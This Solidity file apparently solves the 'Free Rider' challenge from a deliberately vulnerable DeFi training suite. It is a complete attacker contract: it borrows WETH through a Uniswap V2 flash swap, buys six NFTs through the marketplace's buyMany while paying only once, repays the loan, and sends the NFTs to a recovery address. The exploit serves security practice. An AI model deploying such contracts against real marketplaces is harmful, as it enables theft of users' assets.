// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

// free rider marketplace
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";

import {DamnValuableNFT} from "../DamnValuableNFT.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    // uniswap
    IUniswapV2Factory private immutable _factory;
    IWETH private immutable _weth;
    IUniswapV2Pair private immutable _pair;

    // free rider
    FreeRiderNFTMarketplace private immutable _FRMarketplace;
    address private immutable _recoveryManager;
    DamnValuableNFT private immutable _nft;

    // For this example, store the amount to repay
    uint256 public amountToRepay;

    constructor(
        address _factoryAddress,
        address _dvtAddress,
        address _wethAddress,
        address _recoveryManagerAddress,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _DVNFT
    ) {
        _recoveryManager = _recoveryManagerAddress;
        _FRMarketplace = _marketplace;
        _factory = IUniswapV2Factory(_factoryAddress);
        _weth = IWETH(_wethAddress);
        _pair = IUniswapV2Pair(_factory.getPair(_dvtAddress, _wethAddress));
        _nft = _DVNFT;
    }

    function flashSwap(uint256 wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(msg.sender);

        // amount0Out is DAI, amount1Out is WETH
        _pair.swap(wethAmount, 0, address(this), data);

        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            _nft.safeTransferFrom(address(this), _recoveryManager, tokenId, data);
        }
        payable(msg.sender).transfer(address(this).balance);
    }

    // This function is called by the DAI/WETH pair contract
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(_pair), "not pair");
        require(sender == address(this), "not sender");

        (address caller) = abi.decode(data, (address));

        uint256[] memory tokenIds = new uint256[](6);
        // Your custom code would go here. For example, code to arbitrage.
        _weth.withdraw(amount0);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        _FRMarketplace.buyMany{value: amount0}(tokenIds);

        _weth.deposit{value: amount0}();

        // about 0.3% fee, +1 to round up
        uint256 fee = (amount0 * 3) / 997 + 1;
        amountToRepay = amount0 + fee;

        // Transfer flash swap fee from caller
        _weth.transferFrom(caller, address(this), fee);

        // Repay
        _weth.transfer(address(_pair), amountToRepay);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
